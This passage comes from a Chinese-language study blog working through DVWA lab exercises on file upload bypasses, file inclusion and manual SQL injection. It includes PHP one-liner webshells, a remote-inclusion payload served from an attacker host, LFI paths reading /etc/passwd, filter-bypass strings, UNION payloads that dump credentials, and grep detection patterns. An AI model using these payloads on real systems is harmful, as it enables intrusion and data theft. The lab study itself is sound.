<li><p><strong>getimagesize</strong>：通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错 - 限制上传文件的文件头必须为图像类型</p></li>
<li><p><strong>strrpos(string,find,start)</strong></p>
<p>函数返回字符串 find 在另一字符串 string 中<strong>最后一次出现</strong>的位置，如果没有找到字符串则返回 false，可选参数 start 规定在何处开始搜索</p></li>
</ul>
<ol type="1">
<li>既然一定要是上传图片形式的文件，可以用 copy 将一句话木马和一张图片合并起来 【参照文件包含漏洞攻击】
<ul>
<li>新建 hack.php(写入一句话木马)和 hack.png
<ul>
<li><code>copy hack.png/b+hack.php/a hack1.png</code>，打开 hack1 可以看到，一句话木马藏到了最后</li>
<li>Upload，中国菜刀地址栏填入http://192.168.50.129/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/hackable/uploads/hack1.png</li>
</ul></li>
</ul></li>
<li><strong>%00 截断</strong>的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片 【未成功】 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原理分析</span></span><br><span class="line">0x00，%00，/00之类的截断，都是一样的，只是不同表示而已</span><br><span class="line"></span><br><span class="line"><span class="comment"># %00截断</span></span><br><span class="line">URL-encode ASCII Value</span><br><span class="line">%00        0</span><br><span class="line">&gt; 在URL表示中%00表示ASCII码中的0</span><br><span class="line">&gt; ASCII码中的0作为特殊字符保留，表示字符串结束</span><br><span class="line">&gt; 当URL中出现%00时就会认为读取已结束</span><br><span class="line"></span><br><span class="line">https://mp.csdn.net/upfiles/?filename=test.txt 此时输出的是test.txt</span><br><span class="line">加上%00</span><br><span class="line">https://mp.csdn.net/upfiles/?filename=test.php%00.txt 此时输出的是test.php</span><br><span class="line">就绕过了后缀限制，可以上传webshell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0X00截断</span></span><br><span class="line">----待补充</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>参考资料：
<ul>
<li>https://blog.csdn.net/csdnmmd/article/details/80164823</li>
<li>https://www.cnblogs.com/zhengna/p/12764684.html</li>
<li>https://zhuanlan.zhihu.com/p/35932383</li>
</ul></li>
</ul>
<h2 id="中国菜刀">中国菜刀</h2>
<h3 id="使用简介">使用简介</h3>
<ol type="1">
<li>文件管理</li>
<li>虚拟终端</li>
<li>数据库管理
<ul>
<li>编辑 SHELL
<ul>
<li>地址：shell 文件地址 + shell 连接密码</li>
<li>“配置”下输入 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;T&gt;MYSQL&lt;/T&gt;</span><br><span class="line">&lt;H&gt;localhost&lt;/H&gt;</span><br><span class="line">&lt;U&gt;root&lt;/U&gt;</span><br><span class="line">&lt;P&gt;owaspbwa&lt;/P&gt;</span><br></pre></td></tr></table></figure></li>
<li>shell 类型和字符集</li>
</ul></li>
<li>测试指令 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dvwa.users;</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li>设置启动密码</li>
<li>网站扫描 - 少用</li>
</ol>
<h3 id="原理解析">原理解析</h3>
<h2 id="文件上传漏洞渗透防御">文件上传漏洞渗透防御</h2>
<ol type="1">
<li><p><strong>在代码层面的检测</strong>：对文件的后缀等进行相应的检测和限制</p></li>
<li><p><strong>在前端部署 web 应用防火墙</strong>，对某些带有恶意特征信息的文件进行拦截，查看是否有 eval 和 POST 的标记</p></li>
<li><p>怀疑有木马，从网站文件中过滤关键字 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -R递归</span></span><br><span class="line"><span class="comment"># 在文件中搜索</span></span><br><span class="line">egrep -R <span class="string">&#x27;eval\(\$_POST\[&#x27;</span> /var/www/dvwa</span><br><span class="line">fgrep -R <span class="string">&#x27;eval($_POST[&#x27;</span> /var/www/dvwa</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="文件包含漏洞渗透攻击-file-inclusion">文件包含漏洞渗透攻击 File Inclusion</h1>
<p>文件包含是正常的，类似于 C 语言中 include 各种头文件，不可能把所有代码和所有功能都写在一个文件中(1.内容过长；2.重复编码)</p>
<h2 id="原理-1">原理</h2>
<blockquote>
<p>文件包含即程序通过<strong>包含函数</strong>调用本地或远程文件，以此来实现拓展功能。被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。文件包含漏洞主要发生在有包含语句的环境中，例如 PHP 所具备 include、require 等包含函数</p>
<p>当服务器开启<strong>allow_url_include</strong>选项时，就可以通过 php 的某些特性函数(include(), require()和 include_once(), require_once())利用 url 去动态包含文件，此时如果没有对<u>文件来源</u>进行严格审查，就会导致任意文件读取或者任意命令执行</p>
<p>本地文件包含：被包含的文件在服务器本地；远程文件包含漏洞：被包含的文件在第三方服务器，是因为开启了 php 配置中的<strong>allow_url_fopen</strong>选项(选项开启之后，服务器允许包含一个远程的文件)</p>
<p>远程文件包含较本地文件包含容易，因为本地文件包含需要黑客把恶意文件传输到本地，而远程文件包含是主动访问 webserver 上的内容</p>
<p>服务器通过 php 的特性(函数)去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以包含一个恶意文件</p>
</blockquote>
<p><img src="phpini.png" alt="phpini" style="zoom:67%;" /></p>
<p><img src="fileinclusion.png" /></p>
<p><img src="fileinclusion2.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 理解为打开shell.php文件写入一句话木马</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>图片一句话木马：图片中不是一句话木马，因为无法执行，中国菜刀连不上，把代码放在图片中，中国菜刀连上了也无法使用。c.jpg 中的代码执行并生成 webshell</p>
<p>上传一句话木马图片容易，难点在于图片里面的代码能不能执行，也取决于图片文件能不能被包含。在执行过程中，我们可能会看到乱码，但是在乱码之中也会有正常代码的执行</p>
</blockquote>
<hr />
<ul>
<li><p>low security</p>
<ul>
<li><p>对包含的文件没有进行任何的过滤，可以进行包含<u>任意的文件</u></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>环境中给出的地址如下：http://192.168.50.129/dvwa/vulnerabilities/fi/?page=include.php，则我们在/var/www/dvwa/vulnerabilities/fi/目录下创建文件 1.php，写入<code>&lt;?php echo "hihi";?&gt;</code></p>
<p><img src="fileinclusion-test.png" alt="image-20200805143852598" style="zoom:50%;" /></p></li>
<li><p>在浏览器中输入http://192.168.50.129/dvwa/vulnerabilities/fi/index.php?page=1.php 或者是http://192.168.50.129/dvwa/vulnerabilities/fi/?page=1.php，则会运行 1.php 代码</p>
<p>或者尝试包含账号密码、系统信息、敏感文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;var&#x2F;www&#x2F;dvwa&#x2F;robots.txt</span><br><span class="line"># robots 网络爬虫排除标准 是爬虫爬取的公共协议和行业规范，表示哪些不能爬取</span><br></pre></td></tr></table></figure>
<p><img src="fileinclusion-test2.png" /></p></li>
</ul>
<hr />
<p>本地文件包含+webshell</p>
<ul>
<li><p>制作一句话图片木马</p>
<ol type="1">
<li>工具 edjpgcom：https://blog.csdn.net/santtde/article/details/92849299 - 说实话未成功</li>
<li>手动制作：https://www.15qq.cn/hacker_script/12.html - 通过 copy</li>
</ol></li>
<li><p>上传图片木马文件 - 通过文件上传漏洞 upload</p>
<ul>
<li>此时可以在浏览器中打开图片(通过访问 /hackable/uploads 目录)，图片正常显示，但是图片中包含的 shell 并不会执行，因为服务器不会执行静态资源</li>
<li>我们需要的是图片在服务器被当成程序执行</li>
</ul></li>
<li><p>执行文件包含并生成后门</p>
<ul>
<li><p>图片位置不一致</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 文件上传目录</span><br><span class="line">/var/www/dvwa/hackable/uploads/</span><br><span class="line"># 文件包含目录</span><br><span class="line">/var/www/dvwa/vulnerabilities/fi/</span><br><span class="line"></span><br><span class="line"># 相对路径</span><br><span class="line">192.168.50.129/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.JPG</span><br><span class="line"># 绝对路径</span><br><span class="line">192.168.50.129/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/hackable/uploads/shell.JPG</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>通过文件包含漏洞访问图片后，页面显示如下</p>
<p><img src="fileinclusion-test3.png" /></p>
<ul>
<li><p>通过菜刀连接 webshell</p>
<ul>
<li>图片中的木马会执行，在<code>/var/www/dvwa/vulnerabilities/fi/</code>目录下生成一个 php 文件，使用该 php</li>
</ul></li>
<li><p>参考资料</p>
<ul>
<li>https://blog.csdn.net/Alexz__/article/details/102166392</li>
<li>踩坑，不会成功的情况
<ol type="1">
<li>用 edjpgcom 工具</li>
<li>图片是 jpg</li>
</ol></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<hr />
<p>远程文件包含 + webshell</p>
<ul>
<li><p>使用 kali 建立远程服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动apache</span></span><br><span class="line">systemctl start apache2</span><br><span class="line"><span class="comment"># 建立文件</span></span><br><span class="line">vim /var/www/html/1.txt</span><br><span class="line">&lt;?fputs(fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[pass]);?&gt;&#x27;</span>)?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果建立的是php文件，会出现一句话木马无法写入shell.php的情况</span></span><br><span class="line"><span class="comment"># 使用txt或者jpg进行远程文件包含</span></span><br></pre></td></tr></table></figure></li>
<li><p>文件包含</p>
<p>http://192.168.50.129/dvwa/vulnerabilities/fi/?page=http://192.168.50.128/1.txt</p>
<p>此时在/var/www/dvwa/vulnerabilities/fi 目录下会出现 shell.php 文件</p></li>
<li><p>菜刀通过输入<code>http://192.168.50.129/dvwa/vulnerabilities/fi/shell.php</code>和 pass 密码进行连接</p></li>
</ul>
<hr />
<ul>
<li><p>medium security</p>
<ul>
<li><p>对本地没有限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">// The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bad input validation</span></span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);        </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>远程文件包含+webshell</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">httphttp://://</span><br><span class="line">hthttp://tp://</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>high security</p>
<ul>
<li>硬编码写死，只能用 include.php 文件，利用白名单机制进行过滤，即很难再进行漏洞的利用</li>
<li>对包含的文件稍微做些检测</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only allow include.php</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>参考资料：https://www.freebuf.com/articles/web/119150.html</p></li>
</ul>
<hr />
<h1 id="sql-注入攻击---排在第一位的安全风险">SQL 注入攻击 - 排在第一位的安全风险</h1>
<blockquote>
<p>通过<u>构建特殊的输入作为参数</u>传入<strong>web 应用程序</strong>，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所有的操作</p>
<p>其主要原因是程序没有细致地<u>过滤用户输入的数据</u>，导致非法数据入侵系统</p>
<ol type="1">
<li>对于 web 应用程序而言，用户核心数据存储在数据库中，例如 MySQL、SQL server、Oracle</li>
<li>通过 SQL 注入攻击，可以获取、修改、删除数据库信息，并且通过提权来控制 web 服务器等其他操作</li>
<li>SQL 注入即攻击者通过构造特殊的 SQL 语句，入侵目标系统，导致后台数据库<u>泄露数据</u>的过程</li>
<li>因为 SQL 注入漏洞造成的严重危害性，所以常年稳居 OWASP TOP10 的榜首</li>
</ol>
<p>SQL 注入的危害</p>
<ol type="1">
<li>拖库导致用户数据泄露</li>
<li>危害 web 等应用的安全</li>
<li>失去操作系统的控制权</li>
<li>用户信息被非法买卖</li>
<li>危害企业及国家的安全</li>
</ol>
</blockquote>
<h2 id="sql-基础回顾">SQL 基础回顾</h2>
<p>登录 OWASP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表1：dvwa.users</span><br><span class="line">表2：wordpress.wp_users</span><br><span class="line">表3：mysql.user</span><br><span class="line"></span><br><span class="line">root@owaspbwa:~# mysql -uroot -p&#39;owaspbwa&#39;</span><br><span class="line">&gt; show databases</span><br><span class="line">&gt; show tables</span><br><span class="line">&gt; DESC &#x2F; DESCRIBE users</span><br><span class="line"># Key 可能指主键、外键或者索引</span><br><span class="line"># 查看建表的具体信息</span><br><span class="line">&gt; show create table users\G</span><br><span class="line"># 查看表的内容</span><br><span class="line">select * from users;</span><br><span class="line">select * from users\G;</span><br><span class="line"></span><br><span class="line"># 一些函数</span><br><span class="line">select database();</span><br><span class="line">select user();</span><br><span class="line">select now();</span><br><span class="line"></span><br><span class="line"># 正确写法</span><br><span class="line">select user from users where user_id &#x3D; 1;</span><br><span class="line">select user from users where user_id &#x3D; &#39;1&#39;;</span><br><span class="line">select user from users where user &#x3D; &#39;root&#39;;</span><br><span class="line"># 错误写法</span><br><span class="line">select user from users where user &#x3D; root;</span><br><span class="line"># 如果root不加引号，则会被识别成一个字段&#x2F;列名字，而数字无论加不加引号。都会被识别成数字</span><br><span class="line"></span><br><span class="line"># 漏洞</span><br><span class="line">select user_id,first_name,last_name from dvwa.users where first_name &#x3D; &#39;zzr&#39;;</span><br><span class="line">select user_id,first_name,last_name from dvwa.users where first_name &#x3D; &#39;zzr&#39; or 1&#x3D;1;</span><br><span class="line"></span><br><span class="line"># 上述语句(布尔查询)只能获得后端代码原有sql语句控制的字段，而我们需要拖库，即获得整个表</span><br><span class="line"># 联合查询UNION</span><br><span class="line"># 注：union查询前后字段数必须相同</span><br><span class="line">select user,password from mysql.user;</span><br><span class="line">select user_login,user_pass from wordpress.wp_users;</span><br><span class="line">select user,password from mysql.user union select user_login,user_pass from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 数字可以充当字段</span><br><span class="line">select user,password,host from mysql.user union select user_login,user_pass,1 from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 前者的字段数量和字段名靠猜</span><br><span class="line"># 后者不够的靠补，字段名靠猜</span><br><span class="line">select * from dvwa.users union select 1;</span><br><span class="line">...</span><br><span class="line">select * from dvwa.users union select 1,2,3,4,5;</span><br><span class="line"># 不知道这个系统中有多少库、库里有哪些表、表中有哪些字段、权限问题</span><br><span class="line"></span><br><span class="line"># 前者的查询结果不要(通过假条件)，只显示后者的查询结果</span><br><span class="line"># 但是字段名还是显示的前者的字段名</span><br><span class="line">select user,password,host from mysql.user where 1&#x3D;2 union select user_login,user_pass,1 from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 查询的权限取决于开发人员给你定义的用户的权限</span><br></pre></td></tr></table></figure>
<p><strong>information_schema</strong> - 数据库字典</p>
<p>在里面看到的不一定是一切，得看权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># show databases; 后有一个非常重要的库是 information_schema</span><br><span class="line">use information_schema;</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">******第一个重要的表 information_schema.tables******</span><br><span class="line"></span><br><span class="line"># 保存了数据库的所有表所有列的元数据meta data &gt; 信息纲要</span><br><span class="line"># 查询数据库库名、表名 information_schema.tables</span><br><span class="line">select * from information_schema.TABLES\G</span><br><span class="line"># 得到 TABLE_SCHEMA 是库的名字 TABLE_NAME 是表的名字</span><br><span class="line"># TABLES中包含所有数据库的所有表名</span><br><span class="line"></span><br><span class="line">select DISTINCT TABLE_SCHEMA from information_schema.TABLES; # 等价于show databases</span><br><span class="line"></span><br><span class="line">select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES\G</span><br><span class="line"></span><br><span class="line">select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G</span><br><span class="line"># CONCAT是字符串拼接 GROUP_CONCAT 分组</span><br><span class="line"></span><br><span class="line">select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA&#x3D;&#39;dvwa&#39;; # 等价于show tables</span><br><span class="line"></span><br><span class="line">******第二个重要的表 information_schema.columns******</span><br><span class="line"></span><br><span class="line"># 查询数据库库名、表名、字段名 (TABLE_SCHEMA TABLE_NAME COLUMN_NAME)</span><br><span class="line"># 获得所有列的信息</span><br><span class="line">select * from information_schema.columns\G</span><br><span class="line"></span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns;</span><br><span class="line"></span><br><span class="line"># 某个库的某个表的列 - desc </span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39;;</span><br><span class="line"></span><br><span class="line"># 查看用户权限 - 系统库</span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_name &#x3D; &#39;USER_PRIVILEGES&#39;;</span><br><span class="line">+----------------+</span><br><span class="line">| column_name    |</span><br><span class="line">+----------------+</span><br><span class="line">| GRANTEE        |</span><br><span class="line">| TABLE_CATALOG  |</span><br><span class="line">| PRIVILEGE_TYPE |</span><br><span class="line">| IS_GRANTABLE   |</span><br><span class="line">+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 查看schema权限</span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_name &#x3D; &#39;SCHEMA_PRIVILEGES&#39;;</span><br><span class="line">+----------------+</span><br><span class="line">| column_name    |</span><br><span class="line">+----------------+</span><br><span class="line">| GRANTEE        |</span><br><span class="line">| TABLE_CATALOG  |</span><br><span class="line">| TABLE_SCHEMA   |</span><br><span class="line">| PRIVILEGE_TYPE |</span><br><span class="line">| IS_GRANTABLE   |</span><br><span class="line">+----------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="sql-注入流程">SQL 注入流程</h2>
<ul>
<li><p>SQL 注入的分类：数字型&amp;字符型</p>
<blockquote>
<p>最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数字型： SELECT 列 FROM 表 WHERE 数字型列&#x3D;值</span><br><span class="line">字符型： SELECT 列 FROM 表 WHERE 字符型列&#x3D;’值’</span><br><span class="line">搜索型： SELECT * FROM 表 WHERE where 被搜索的列 like ‘%值%’</span><br></pre></td></tr></table></figure>
<ul>
<li><p>数字型注入：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试步骤</span><br><span class="line">1. 加单引号：假设对应的sql：select * from table where id&#x3D;1’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</span><br><span class="line">2. 加 1 and 1&#x3D;1：假设对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与只输入1的页面没有任何差异；</span><br><span class="line">3. 加 1 加and 1&#x3D;2：对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</span><br><span class="line"></span><br><span class="line">如果满足以上三点，则可以判断该URL存在数字型注入</span><br><span class="line"></span><br><span class="line">如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</span><br><span class="line">select * from table where id &#x3D; &#39;1 and 1&#x3D;1&#39;</span><br><span class="line">select * from table where id &#x3D; &#39;1 and 1&#x3D;2&#39;</span><br><span class="line">查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果</span><br><span class="line"></span><br><span class="line">如果2，3步骤输入均出现正确结果，则能证明不是数字型注入</span><br></pre></td></tr></table></figure></li>
<li><p>字符型注入：当输入的参数为字符串时，称为字符型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试步骤</span><br><span class="line">1. 加单引号：select * from table where id&#x3D;’1’’：由于加单引号后变成三个单引号，则无法执行，程序会报错；</span><br><span class="line">2. 加 1’ and 1&#x3D;1 此时sql 语句为：select * from table where id&#x3D;’1’ and 1&#x3D;1’ ,也无法进行注入，还需要通过注释符号将后面的单引号闭合；</span><br><span class="line"></span><br><span class="line">&gt; Mysql 有三种常用注释符：</span><br><span class="line">&gt; -- 注意，这种注释符后边有一个空格</span><br><span class="line">&gt; # 通过#进行注释</span><br><span class="line">&gt; &#x2F;* *&#x2F; 注释掉符号内的内容</span><br><span class="line"></span><br><span class="line">3. 加 1’ and 1&#x3D;2 -- zzr 此时sql语句为：select * from table where id&#x3D;’1’ and 1&#x3D;2 --zzr’，没有显示任何东西</span><br><span class="line"></span><br><span class="line">如果满足以上三点，可以判断该url为字符型注入</span><br><span class="line"></span><br><span class="line">select * from table where id &#x3D; &#39;1&#39; and 1&#x3D;1</span><br><span class="line">语法正确，逻辑判断正确，所以返回正确</span><br><span class="line">select * from table where id &#x3D; &#39;1&#39; and 1&#x3D;2</span><br><span class="line">语法正确，但逻辑判断错误，所以没有显示</span><br><span class="line"></span><br><span class="line">select * from table where id &#x3D; &quot;$id&quot;;</span><br><span class="line">select * from table where id &#x3D; &#39;$id&#39;;</span><br></pre></td></tr></table></figure></li>
<li><p>SQL 注入分类可以按照参数类型分为数字型和字符型，还有一些常见的注入分类，例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）POST：注入字段位于POST数据中；</span><br><span class="line">（2）Cookie：注入字段位于Cookie数据中；</span><br><span class="line">（3）延时注入：根据数据库延时特性的注入</span><br><span class="line">（4）搜索注入：注入字段在搜索的位置；</span><br><span class="line">（5）base64注入：注入字符经过base64编码后注入；</span><br><span class="line">（7）错误注入：基于数据库错误信息的响应注入</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>常规思路：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 判断是否有SQL注入漏洞(通过web扫描工具，扫描SQL漏洞注入点)</span><br><span class="line">2. 判断操作系统、数据库和web应用的类型，猜解关键数据库表及其重要字段与内容</span><br><span class="line">3. 获取数据库信息，包括管理员信息及拖库，寻找后台登录</span><br><span class="line">4. 加密信息破解，sqlmap可自动破解</span><br><span class="line">5. 提升权限，获得sql-shell、os-shell、登录应用后台</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="手动注入实战">手动注入实战</h2>
<h3 id="基于错误的注入---判断是否有注入漏洞">基于错误的注入 - 判断是否有注入漏洞</h3>
<p>错误注入的思路是通过构造特殊的 sql 语句，根据得到的<u>错误信息</u>，确认 sql 注入点。通过数据库报错信息，也可以探测到数据库的类型和其它有用信息。通过输入单引号，<u>触发数据库异常</u>，通过异常日志诊断数据库类型，例如这里是 MySQL 数据库</p>
<ul>
<li><p>low security</p>
<p>没有做安全过滤，直接将获取的值带入数据库语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>字符型注入</strong></p>
<p>当前 SQL 所使用的库为 dvwa，搜索框正常输入 1 ，能够查询处结果</p>
<p>输入单引号，产生了<u>语法错误</u>(有注入的可能性、有注入点，如果弹出信息表示输入错误，说明单引号不能作为输入，被过滤了)，说明能够<strong>接受</strong>单引号作为输入，即用户的输入没有被正当处理，如果后台的处理能够主动过滤单引号(不会把单引号带入 sql 语句中)，则也不会引起错误了 - 通过单引号构造语句</p>
<p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;&#39; at line 1</span><br><span class="line"></span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;&#39;</span><br><span class="line">select first_name,last_name from dvwa.users where user_id &#x3D; &#39;1&#39;</span><br><span class="line">select first_name,last_name from dvwa.users where user_id &#x3D; &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># 获取当前数据库</span><br><span class="line">1&#39; union select 1,database() #</span><br><span class="line"></span><br><span class="line"># 获取数据库中的表</span><br><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line"># 获取表中的字段名</span><br><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line"></span><br><span class="line"># 得到数据</span><br><span class="line">1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #</span><br><span class="line"></span><br><span class="line"># 此处password是密文，需要MD５转换</span><br></pre></td></tr></table></figure></p>
<h3 id="基于布尔的注入">基于布尔的注入</h3>
